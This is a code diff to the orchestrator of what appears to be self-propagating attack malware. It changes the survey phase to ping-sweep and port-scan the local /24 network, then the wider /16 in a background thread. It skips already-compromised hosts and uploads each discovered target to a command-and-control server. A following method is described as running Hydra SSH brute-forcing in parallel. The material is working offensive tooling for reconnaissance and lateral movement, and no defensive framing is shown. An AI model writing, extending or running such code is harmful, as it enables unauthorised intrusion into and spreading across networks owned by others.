@@ -109,21 +109,39 @@ class Orchestrator:
             target['actions'] = actions
 
     def _phase_survey(self):
-        """Discover local subnet and expand to /16."""
-        ip = get_local_ip()  # use imported function, not self.net.get_local_ip()
-        subnets = self.net.get_expanded_subnets(ip)
-        for subnet in subnets:
-            logger.info("Scanning subnet: %s", subnet)
-            hosts = self.net.ping_sweep(subnet)
-            logger.info("Discovered %d hosts in %s", len(hosts), subnet)
-            for host in hosts:
-                if host in self.compromised:
-                    continue
+        """Discover local subnet and expand to /16 (background)."""
+        ip = get_local_ip()
+        subnets = self.net.get_expanded_subnets(ip)  # returns [/24, /16]
+
+        # 1. Scan /24 synchronously (fast)
+        subnet = subnets[0]
+        logger.info("Scanning subnet: %s", subnet)
+        hosts = self.net.ping_sweep(subnet)
+        logger.info("Discovered %d hosts in %s", len(hosts), subnet)
+        for host in hosts:
+            if host not in [t['ip'] for t in self.targets] and host not in self.compromised:
                 ports = self.net.quick_scan(host)
                 if ports:
                     self.targets.append({'ip': host, 'ports': ports})
         for t in self.targets:
             self.c2.upload_target(t)
+
+        # 2. Start /16 scan in background (if not already running)
+        if len(subnets) > 1 and not hasattr(self, '_background_scan_started'):
+            self._background_scan_started = True
+            def background_scan():
+                logger.info("Background scan started for: %s", subnets[1])
+                bg_hosts = self.net.ping_sweep(subnets[1])
+                logger.info("Background scan discovered %d hosts in %s", len(bg_hosts), subnets[1])
+                for host in bg_hosts:
+                    # Avoid duplicates
+                    if host not in [t['ip'] for t in self.targets] and host not in self.compromised:
+                        ports = self.net.quick_scan(host)
+                        if ports:
+                            self.targets.append({'ip': host, 'ports': ports})
+                            self.c2.upload_target({'ip': host, 'ports': ports})
+            import threading
+            threading.Thread(target=background_scan, daemon=True).start()
 
     def _phase_escalate(self):
         """Parallel Hydra on all SSH targets, then fallback."""
